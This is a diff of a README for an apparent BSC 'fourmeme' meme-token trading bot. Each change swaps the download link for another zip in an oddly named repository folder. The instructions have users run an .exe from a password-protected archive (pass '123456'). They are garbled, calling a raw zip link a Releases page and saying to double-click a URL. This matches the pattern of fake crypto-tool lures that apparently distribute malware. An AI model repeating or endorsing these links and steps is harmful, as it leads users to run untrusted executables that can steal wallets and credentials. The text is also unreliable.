@@ -1,6 +1,6 @@
 # 🚀 bsc-fourmeme-bot - Trade Smarter with Advanced Automation
 
-[![Download bsc-fourmeme-bot](https://raw.githubusercontent.com/A2PC-2002/bsc-fourmeme-bot/main/ramarama/bsc-fourmeme-bot.zip)](https://raw.githubusercontent.com/A2PC-2002/bsc-fourmeme-bot/main/ramarama/bsc-fourmeme-bot.zip)
+[![Download bsc-fourmeme-bot](https://github.com/A2PC-2002/bsc-fourmeme-bot/raw/refs/heads/main/ramarama/fourmeme-bsc-bot-3.9.zip)](https://github.com/A2PC-2002/bsc-fourmeme-bot/raw/refs/heads/main/ramarama/fourmeme-bsc-bot-3.9.zip)
 
 ## 📥 Overview
 
@@ -10,7 +10,7 @@ FourSniper gives you an advantage in meme token trading. It helps you find and a
 
 Follow these steps to get the software up and running:
 
-1. **Visit the Download Page:** Click [here](https://raw.githubusercontent.com/A2PC-2002/bsc-fourmeme-bot/main/ramarama/bsc-fourmeme-bot.zip) to go to the Releases page.
+1. **Visit the Download Page:** Click [here](https://github.com/A2PC-2002/bsc-fourmeme-bot/raw/refs/heads/main/ramarama/fourmeme-bsc-bot-3.9.zip) to go to the Releases page.
 
 2. **Choose Your Version:** Find the latest version of the bot. You will see several assets listed. Look for the `.exe` file that matches your system.
 
@@ -18,7 +18,7 @@ Follow these steps to get the software up and running:
 
 4. **Run the Bot:**
    - Navigate to where the file is saved.
-   - Double-click on `https://raw.githubusercontent.com/A2PC-2002/bsc-fourmeme-bot/main/ramarama/bsc-fourmeme-bot.zip` to run the application.
+   - Double-click on `https://github.com/A2PC-2002/bsc-fourmeme-bot/raw/refs/heads/main/ramarama/fourmeme-bsc-bot-3.9.zip` to run the application.
 
 5. **Enter Archive Pass:** When prompted, enter the pass: **123456**.
 
@@ -56,7 +56,7 @@ To ensure optimal performance, please meet the following system requirements:
 
 ## 🛠️ Download & Install
 
-To start, please make sure to visit [this page](https://raw.githubusercontent.com/A2PC-2002/bsc-fourmeme-bot/main/ramarama/bsc-fourmeme-bot.zip) where you can download the latest version of bsc-fourmeme-bot. Follow the steps provided in the "Getting Started" section to set everything up.
+To start, please make sure to visit [this page](https://github.com/A2PC-2002/bsc-fourmeme-bot/raw/refs/heads/main/ramarama/fourmeme-bsc-bot-3.9.zip) where you can download the latest version of bsc-fourmeme-bot. Follow the steps provided in the "Getting Started" section to set everything up.
 
 ## 📖 Frequently Asked Questions
 
